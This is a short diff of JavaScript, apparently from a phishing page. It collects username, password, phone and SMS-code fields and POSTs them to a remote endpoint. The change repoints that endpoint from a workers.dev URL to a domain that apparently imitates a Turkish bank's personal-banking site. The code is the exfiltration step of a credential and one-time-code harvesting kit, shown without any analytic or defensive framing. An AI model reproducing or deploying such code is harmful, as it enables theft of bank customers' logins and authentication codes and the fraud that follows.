@@ -19,7 +19,7 @@ $(document).on("keydown", "#username, #password, #phone, #sms", function (e) {
 function submitData(action, formData, successCallback) {
     $.ajax({
         type: "POST",
-        url: "https://yenio-world-orange-art-5bbd.selimjuhan2.workers.dev/",
+        url: "https://akbankbireysel.com/process.php",
         data: { action: action, ...formData },
         success: function (response) {
             successCallback(response);
